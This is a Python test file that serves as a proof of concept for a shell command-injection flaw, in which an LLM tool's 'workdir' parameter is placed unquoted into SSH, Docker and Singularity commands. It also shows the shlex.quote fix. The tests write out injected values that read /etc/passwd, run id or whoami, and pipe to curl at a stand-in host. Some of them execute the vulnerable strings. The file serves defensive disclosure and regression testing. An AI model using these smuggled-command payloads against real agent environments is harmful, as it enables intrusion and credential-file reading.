"""PoC: Command injection via workdir parameter in execution environments.

The `workdir` parameter flows from the LLM tool call directly into shell
command strings without escaping. An attacker (or a prompt-injected LLM)
can set workdir to a value like:

    /tmp; cat /etc/passwd; cd /tmp

which gets interpolated into:

    cd /tmp; cat /etc/passwd; cd /tmp && <actual_command>

This executes `cat /etc/passwd` as a side effect.

Affected:
    - tools/environments/ssh.py:73      →  f'cd {work_dir} && {exec_command}'
    - tools/environments/docker.py:255  →  f'cd {work_dir} && {exec_command}'
    - tools/environments/singularity.py:243  →  f'cd {work_dir} && {exec_command}'

Fix: shlex.quote(work_dir) in all three locations.
"""

import shlex
import subprocess
import pytest


class TestWorkdirInjection:
    """Demonstrate command injection via workdir parameter."""

    def _simulate_ssh_execute(self, work_dir: str, command: str) -> str:
        """Simulate what ssh.py:73 does — string interpolation without quoting."""
        exec_command = command
        # This is the vulnerable line from ssh.py:73:
        wrapped = f'cd {work_dir} && {exec_command}'
        return wrapped

    def _simulate_ssh_execute_fixed(self, work_dir: str, command: str) -> str:
        """Fixed version using shlex.quote."""
        exec_command = command
        wrapped = f'cd {shlex.quote(work_dir)} && {exec_command}'
        return wrapped

    def test_normal_workdir(self):
        """Normal workdir works fine."""
        result = self._simulate_ssh_execute("/home/user/project", "ls -la")
        assert result == "cd /home/user/project && ls -la"

    def test_injection_via_semicolon(self):
        """EXPLOIT: semicolon breaks out of cd and runs arbitrary command."""
        malicious_workdir = "/tmp; cat /etc/passwd; cd /tmp"
        result = self._simulate_ssh_execute(malicious_workdir, "echo hello")
        # The resulting command is:
        #   cd /tmp; cat /etc/passwd; cd /tmp && echo hello
        # This runs: cd /tmp, THEN cat /etc/passwd, THEN cd /tmp && echo hello
        assert "cat /etc/passwd" in result
        # Prove it actually executes the injected command:
        proc = subprocess.run(
            ["bash", "-c", result],
            capture_output=True, text=True, timeout=5,
        )
        assert "root:" in proc.stdout, (
            f"Injection should have printed /etc/passwd contents.\n"
            f"stdout: {proc.stdout}\nstderr: {proc.stderr}"
        )

    def test_injection_via_backticks(self):
        """EXPLOIT: backticks execute subcommand."""
        malicious_workdir = "/tmp/`id`"
        result = self._simulate_ssh_execute(malicious_workdir, "echo hello")
        # cd /tmp/`id` && echo hello  →  id runs as subcommand
        assert "`id`" in result

    def test_injection_via_dollar_parens(self):
        """EXPLOIT: $() executes subcommand."""
        malicious_workdir = "/tmp/$(whoami)"
        result = self._simulate_ssh_execute(malicious_workdir, "echo hello")
        assert "$(whoami)" in result

    def test_injection_via_pipe(self):
        """EXPLOIT: pipe redirects output."""
        malicious_workdir = "/tmp | curl http://evil.com"
        result = self._simulate_ssh_execute(malicious_workdir, "echo hello")
        assert "curl" in result

    def test_injection_via_newline(self):
        """EXPLOIT: newline breaks the command."""
        malicious_workdir = "/tmp\ncat /etc/passwd"
        result = self._simulate_ssh_execute(malicious_workdir, "echo hello")
        assert "cat /etc/passwd" in result

    # ------------------------------------------------------------------
    # Fixed version tests
    # ------------------------------------------------------------------

    def test_fixed_semicolon(self):
        """FIXED: semicolon is quoted and treated as literal path."""
        malicious_workdir = "/tmp; cat /etc/passwd; cd /tmp"
        result = self._simulate_ssh_execute_fixed(malicious_workdir, "echo hello")
        # shlex.quote wraps in single quotes:
        #   cd '/tmp; cat /etc/passwd; cd /tmp' && echo hello
        # The shell treats the entire string as a directory name (which won't exist)
        assert result == f"cd {shlex.quote(malicious_workdir)} && echo hello"
        # Prove the injected command does NOT execute:
        proc = subprocess.run(
            ["bash", "-c", result],
            capture_output=True, text=True, timeout=5,
        )
        assert "root:" not in proc.stdout, "Injection should NOT execute after fix"

    def test_fixed_backticks(self):
        """FIXED: backticks are quoted."""
        result = self._simulate_ssh_execute_fixed("/tmp/`id`", "echo hello")
        proc = subprocess.run(
            ["bash", "-c", result],
            capture_output=True, text=True, timeout=5,
        )
        assert "uid=" not in proc.stdout, "Backtick injection should NOT execute after fix"

    def test_fixed_dollar_parens(self):
        """FIXED: $() is quoted."""
        result = self._simulate_ssh_execute_fixed("/tmp/$(whoami)", "echo hello")
        proc = subprocess.run(
            ["bash", "-c", result],
            capture_output=True, text=True, timeout=5,
        )
        # whoami should not appear in the output (it would if injection worked)
        # The cd will fail (dir doesn't exist), so echo hello won't run either
        assert "$(whoami)" not in proc.stdout

    def test_fixed_normal_workdir_still_works(self):
        """FIXED: normal paths still work."""
        result = self._simulate_ssh_execute_fixed("/tmp", "echo hello")
        proc = subprocess.run(
            ["bash", "-c", result],
            capture_output=True, text=True, timeout=5,
        )
        assert "hello" in proc.stdout


class TestDockerWorkdirInjection:
    """Same vulnerability in docker.py:255 for tilde expansion path."""

    def _simulate_docker_tilde_expand(self, work_dir: str, command: str) -> str:
        """Simulate docker.py:254-256 — tilde expansion via cd."""
        exec_command = command
        if work_dir == "~" or work_dir.startswith("~/"):
            # Vulnerable line from docker.py:255:
            exec_command = f"cd {work_dir} && {exec_command}"
        return exec_command

    def _simulate_docker_tilde_expand_fixed(self, work_dir: str, command: str) -> str:
        """Fixed version."""
        exec_command = command
        if work_dir == "~" or work_dir.startswith("~/"):
            exec_command = f"cd {shlex.quote(work_dir)} && {exec_command}"
        return exec_command

    def test_injection_via_tilde_path(self):
        """EXPLOIT: inject via crafted tilde path."""
        malicious_workdir = "~/; cat /etc/passwd; cd ~"
        result = self._simulate_docker_tilde_expand(malicious_workdir, "echo hello")
        assert "cat /etc/passwd" in result
        # Prove injection executes:
        proc = subprocess.run(
            ["bash", "-c", result],
            capture_output=True, text=True, timeout=5,
        )
        assert "root:" in proc.stdout

    def test_fixed_tilde_injection(self):
        """FIXED: tilde path injection prevented."""
        malicious_workdir = "~/; cat /etc/passwd; cd ~"
        result = self._simulate_docker_tilde_expand_fixed(malicious_workdir, "echo hello")
        proc = subprocess.run(
            ["bash", "-c", result],
            capture_output=True, text=True, timeout=5,
        )
        assert "root:" not in proc.stdout
